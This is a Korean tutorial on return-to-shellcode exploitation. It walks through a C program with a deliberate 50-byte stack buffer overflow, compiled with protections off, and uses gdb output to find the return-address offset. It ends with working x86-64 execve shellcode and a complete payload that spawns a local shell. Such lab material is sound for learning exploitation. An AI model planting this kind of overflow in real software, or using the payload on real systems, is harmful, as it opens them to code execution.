# Return to Shellcode

---

### # What is it??

Return to Shellcode는 Return address 값을 shellcode가 저장된 주소로 변경해, shellcode를 호출하는 방식이다.

Return address 값은 보통 어셈블리어에서 CALL 또는 RET 명령어를 호출 후 스택에 저장이 된다.

----

### # CALL & RET

CALL 명령어는 다음과 같은 행위가 이루어진다.

|  명령어 |  동작  |
| ------------ | ------------ |
|  CALL |  PUSH ReturnAddress <br> JMP <Operation>|

CALL 명령어는 CALL 명령어 다음 명령어의 주소 값을 stack에 저장하고 피연산자 주소로 이동한다.

현재 ESP가 다음 명령어로 이동할 주소 값을 가르키고 있고, 이때 RET 명령어는 POP 명령어로 EIP에 저장하고 해당 주소로 이동한다.

|  명령어 |  동작  |
| ------------ | ------------ |
|  RET |  POP EIP <br> JMP EIP|

---

### # Preview

예제를 통해 실습을 해보자

아래 코드는 실습에 사용될 코드이다.

```c
#include <stdio.h>
#include <unistd.h>
 
void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```

우선 위 코드를 보고 스택 구조를 그려보자.

- 11 -> 4 : main()함수에서 vuln() 함수를 호출한다. 스택에는 main() 함수에서 vuln() 함수 호출 후 주소를 저장한다.



```
low address

========================
main() 함수(12번째 줄)로 돌아갈 주소
========================

high address
```

- 4 : 함수의 프롤로그가 시작된다.

PUSH EBP

MOV EBP ESP

```
low address

========================
main() 함수의 EBP
========================
main() 함수(12번째 줄)로 돌아갈 주소
========================

high address
```

- 5 : buf 변수의 공간(50bytes)이 할당된다.

```
low address

========================
buf 공간
========================
main() 함수의 EBP
========================
main() 함수(12번째 줄)로 돌아갈 주소
========================

high address
```

- 7 : buf 변수에 100bytes 까지 값을 저장할 수 있게 read 함수를 쓴다. 이때 50bytes 이상 값을 쓰면 buf 공간 아래에 있는 공간에 침범 할 수 있게 된다.

- 8 : 함수의 종료가 일어난다.

POP EBP

```
low address

========================
main() 함수(12번째 줄)로 돌아갈 주소
========================

high address
```

RET (POP EIP & JMP EIP)

```
low address

========================
========================

high address
```
---

### # Proof of concept 

위 코드를 gcc 명령어로 아래와 같은 옵션을 추가하여 컴파일 하자.

```bash
gcc -z execstack -fno-stack-protector -o poc poc.c
```

우선 vuln 함수의 시작부분과 read 함수가 호출되는 주소에 breakpoint 를 걸어준다.

```bash
>>> disas vuln
Dump of assembler code for function vuln:
   0x000055555555468a <+0>:     push   rbp
   0x000055555555468b <+1>:     mov    rbp,rsp
   0x000055555555468e <+4>:     sub    rsp,0x40
   0x0000555555554692 <+8>:     lea    rax,[rbp-0x40]
   0x0000555555554696 <+12>:    mov    rsi,rax
   0x0000555555554699 <+15>:    lea    rdi,[rip+0xc4]
   0x00005555555546a0 <+22>:    mov    eax,0x0
   0x00005555555546a5 <+27>:    call   0x555555554550 <printf@plt>
   0x00005555555546aa <+32>:    lea    rax,[rbp-0x40]
   0x00005555555546ae <+36>:    mov    edx,0x64
   0x00005555555546b3 <+41>:    mov    rsi,rax
   0x00005555555546b6 <+44>:    mov    edi,0x0
   0x00005555555546bb <+49>:    call   0x555555554560 <read@plt>
   0x00005555555546c0 <+54>:    nop
   0x00005555555546c1 <+55>:    leave  
   0x00005555555546c2 <+56>:    ret    
End of assembler dump.

>>> b *vuln
>>> b *0x00005555555546bb
```

프로그램을 실행하면 vuln 함수의 프롤로그가 시작하기 전에 프로그램이 멈춘다.
이때 RSP(ESP) 값을 보자. 

```bash
Breakpoint 1, 0x000055555555468a in vuln ()
>>> i r rsp
rsp            0x7fffffffe4a8   0x7fffffffe4a8
>>> x/gx 0x7fffffffe4a8
0x7fffffffe4a8: 0x00005555555546d1
>>> disas main
Dump of assembler code for function main:
   0x00005555555546c3 <+0>:     push   rbp
   0x00005555555546c4 <+1>:     mov    rbp,rsp
   0x00005555555546c7 <+4>:     mov    eax,0x0
   0x00005555555546cc <+9>:     call   0x55555555468a <vuln>
   0x00005555555546d1 <+14>:    nop
   0x00005555555546d2 <+15>:    pop    rbp
   0x00005555555546d3 <+16>:    ret    
End of assembler dump.
>>> 
```

i r rsp 명령어를 통해 RSP 값은 0x0x7fffffffe4a8 이다.

RSP 주소에 저장된 값은 x/gx 0x7fffffffe4a8로 확인하면 0x00005555555546d1 이다. 이 값은 main() 함수에서 CALL 명령어 다음에 실행될 주소이다. 즉 Return address 이다.

c 명령어로 계속 진행한다.

```
>>> c
buf[50] address : 0x7fffffffe460
Breakpoint 2, 0x00005555555546bb in vuln ()
>>> 
```

buf의 주소가 출력되었다. 여기서 그렇다면 main() 함수로 돌아갈 Return address와 buf는 72bytes (0x7fffffffe4a8 - 0x7fffffffe460 = 48) 만큼 떨어져 있다. 

즉 72bytes 의 내용을 shell code로 집어놓고 Return address로 침범하기 위해 shell code의 주소 (8bytes)를 추가로 작성하면 (총 80bytes) vuln() 함수가 끝나고 RET 명령어를 실행할때 shell code가 POP 되어 EIP에 저장되고 이 주소(shell code가 저장된 주소)로 이동하여 shell 이 실행되게 된다.

아래 shell code는 64bit에서 동작하는 27bytes 코드이다.

```
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

그 다음 NOP 값을 (72 - 27) 45bytes 만큼 넣어준 다음 buf 주소를 적어 준다.

```
"\x90" * 45 + "\x60\xe4\xff\xff\xff\x7f\x00\x00"
```

최종적으로 위 payload를 합친 뒤 프로그램에 값을 입력하면 shell을 획득 할 수 있다.

```
$ (python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x90"*45 + "\x60\xe4\xff\xff\xff\x7f\x00\x00"'; cat ) | ./test                                                                                                                                                                                   
buf[50] address : 0x7fffffffe460

ls
test test.c
```

### # Reference
[https://www.lazenca.net/display/TEC/02.Return+to+Shellcode](https://www.lazenca.net/display/TEC/02.Return+to+Shellcode)
